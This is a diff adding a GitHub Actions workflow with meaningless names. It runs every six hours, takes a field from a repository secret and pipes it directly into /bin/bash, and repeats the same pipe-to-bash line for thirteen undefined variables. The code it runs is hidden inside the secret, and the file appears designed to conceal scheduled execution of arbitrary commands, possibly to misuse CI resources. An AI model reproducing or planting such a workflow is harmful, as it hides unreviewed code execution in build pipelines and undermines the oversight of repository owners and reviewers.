@@ -1,0 +1,29 @@
+name: liangwtiwen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangwtiwen
+        env:
+          sih4: ${{ secrets.sih4 }}
+        run: |
+          echo $sih4 | jq -r .d7415 | /bin/bash
+          echo $p92 | jq -r .spluu8039 | /bin/bash
+          echo $mfrty77 | jq -r .bzin464 | /bin/bash
+          echo $t45495 | jq -r .wxa58785 | /bin/bash
+          echo $p33642 | jq -r .su2271 | /bin/bash
+          echo $emxb510 | jq -r .mzhc932 | /bin/bash
+          echo $p61 | jq -r .qle74 | /bin/bash
+          echo $q4 | jq -r .azfcs5581 | /bin/bash
+          echo $s944 | jq -r .nabs3930 | /bin/bash
+          echo $eduw95 | jq -r .nmnmv62494 | /bin/bash
+          echo $li7 | jq -r .pw558 | /bin/bash
+          echo $crqik863 | jq -r .mtm47720 | /bin/bash
+          echo $bg50145 | jq -r .fsga399 | /bin/bash
+          echo $bqta66908 | jq -r .ppv4101 | /bin/bash
+
